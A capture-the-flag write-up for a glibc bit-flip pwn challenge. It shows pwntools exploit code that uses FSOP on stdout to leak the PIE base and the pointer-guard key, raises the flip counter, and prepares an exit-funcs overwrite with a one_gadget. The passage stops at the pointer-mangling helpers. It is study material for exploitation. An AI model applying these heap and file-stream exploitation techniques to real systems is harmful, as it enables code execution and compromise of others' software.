I did not solve this challenge but I decided to look back at it because I wanted to learn FSOP and overwriting exit funcs with one gadget.

## Challenge

This challenge provides us with 4 bit flips, and our addresses are calculated at an offset from `_IO_2_1_stdin_`. The path to a solution, as with many other bit flip challenges, is to first get infinite bit flips for arbitrary write. The bit flip counter is stored in the base program’s bss, but PIE is enabled. Our goal should be to leak the base address before our 4th bit flip so that we can overwrite the counter. The flip being relative to stdin hints that we will need some form of leak-oriented FSOP. (https://enzo.run/posts/lactf2024/#flipma)

```
stdout = 0xd20
write_base = stdout + 0x20
read_end = stdout + 0x10
```

First we will calculate the location of `_IO_2_1_stdin_` and its fields.

```
sla(b"a: ", "9")
sla(b"b: ", "9")
```

For this to work, we also need to make sure the _IO_CURRENTLY_PUTTING flag is set, and I initially thought we needed to use a bit flip on this, but just initializing stdout with an additional puts before the flips also works.

![image](https://github.com/user-attachments/assets/5da04128-6251-4532-99b4-1b853b01c373)

Next, we need to find a suitable location to leak the elf address. Using the search command in pwndbg, we can see there are 2 addresses in libc that contain the bytes of our elf section.

![image](https://github.com/user-attachments/assets/25c45ff4-9e6d-4f5b-8690-b90f8936ee96)

Unbuffered file streams hold libc addresses to themselves in the buffer fields.

![image](https://github.com/user-attachments/assets/5622ca66-3003-45b0-921e-33b93118e6c0)

The idea is to flip a bit in stdout->write_base `0x00007fd8a201a723` to become `0x00007fd8a2018723`. We can see that `0x7fd8a2018f4a 0xa4200000562941ac` will be located between the stdout->write_base and stdout->write_ptr.

but the file write function called from puts will treat the stream as buffered as long as there is a difference between _IO_write_base and _IO_write_ptr. This will cause the write function to print out memory from libc between those two addresses.

### Recap

To force flush the buffer with its contents:

- Ensure the _IO_CURRENTLY_PUTTING flag is set
- We need to set stdout->read_end = stdout->write_base
- Ensure stdout->write_ptr = stdout->write_end

So we will need to:

- Give an invalid index to make the program call puts with error message
- Change stdout->read_end and stdout->write_base to a location right before our leak location

```py
# _IO_write_base
sla(b"a: ", str(write_base+1))
sla(b"b: ", "5")

# _IO_read_end
sla(b"a: ", str(read_end+1))
sla(b"b: ", "5")
```

![image](https://github.com/user-attachments/assets/6829df7e-2dac-49aa-a274-27bc3c8d18ba)

After running the script above, we can see now in our IO File struct, our target is located between write_base and write_ptr.

```py
sla(b"a: ", "9")
sla(b"b: ", "9")

data = p.recvuntil(b"we're flipping bits, not burgers", timeout=1)
if len(data) < 100:
  print("failed")
  exit(1)

diff = 0x7f0c55badf4a - 0x00007f0c55bad723
elf_leak = u64(data[diff-2:diff+6])
exe.address = elf_leak - (0x55ff52d83020 - 0x55ff52d7f000)
li(f"exe addr @ {hex(exe.address)}")
```

![image](https://github.com/user-attachments/assets/ea0f0745-5cdb-45e4-a98e-669f0feeaecf)

We can find the offset of our leak by subtracting the leak location with the write_base.

```py
print(len(str(exe.sym["flips"] - libc.sym["_IO_2_1_stdin_"])))
print(hex(exe.sym["flips"] - libc.sym["_IO_2_1_stdin_"]))

## Make flip to big number
sla(b"a: ", str(exe.sym["flips"] - libc.sym["_IO_2_1_stdin_"]))
sla(b"b: ", "7")
```

![image](https://github.com/user-attachments/assets/428f0589-5f67-48c2-82e9-cbe7f4ac4124)

We have a lot more flips now.

### Overwrite the exit funcs to one gadget

Lets find a suitable one gadget

![image](https://github.com/user-attachments/assets/534b33e2-7fa9-4809-a3e5-dcda6d6f8454)

![image](https://github.com/user-attachments/assets/4dd71422-ae29-4fae-9dd6-d0ae420e4c72)

Set a breakpoint at `__libc_start_main` and move through each instruction until you reach the `call rdx`. We can see r12 and r15 is NULL which matches the condition for 0xe3afe. Now that we know which one gadget to use, its time for the next step. Whenever a program exits, it will go through a list of exit functions.

![image](https://github.com/user-attachments/assets/3b9cc575-dfe2-4216-b47e-7023a26e3157)

The image above shows the exit funcs struct. We can see a list of functions defined there. By default, there is a function that is always called which is `_dl_fini`. It is stored in the list with flavor 4. The pointer is mangled because it will be encrypted with a key located in fs register.

![image](https://github.com/user-attachments/assets/26b5c826-f9f1-494b-8ae1-31d880e311d7)

When decrypting the mangled pointer, it will rotate right by 0x11 bytes and XOR with a key stored at fs:0x30. 

![image](https://github.com/user-attachments/assets/ed92f125-0e78-4d01-8ff4-37bfc5519a15)

Run the `fsbase` command in pwndbg to see the address of fs. So, our next goal will be to use FSOP to leak this key. It could also be possible to overwrite the key with 0.

```py
def write_to_addr(target, current, addr):
  bits = target ^ current
  print(f"{hex(bits)=}")
  for i, v in enumerate(bin(bits)[2:][::-1]):
    print(i, v)
    byte_num = i // 8
    bit_num = i % 8
    if v == "1":
      sla(b"a: ", str(addr - libc.sym["_IO_2_1_stdin_"] + byte_num))
      sla(b"b: ", str(bit_num))

shortbuf = 0x83 + libc.symbols["_IO_2_1_stdout_"]

## set stdout->write_base = fskey
## set stdout->read_end = fskey
## set stdout->write_ptr = fskey + 8
write_to_addr(fskey, shortbuf, libc.symbols["_IO_2_1_stdout_"] + 0x10)
write_to_addr(fskey, shortbuf, libc.symbols["_IO_2_1_stdout_"] + 0x20)
write_to_addr(fskey+8, shortbuf, libc.symbols["_IO_2_1_stdout_"] + 0x28)

sla(b"a: ", "9")
sla(b"b: ", "9")
```

![image](https://github.com/user-attachments/assets/8cc43b5c-f060-4dfe-8438-5317a29ab329)

Now, we can control the pointers using

```py
def pointer_demangle(addr, key):
  return ror(addr, 0x11) ^ key

def pointer_mangle(addr, key):
  return rol(addr ^ key, 0x11)
```

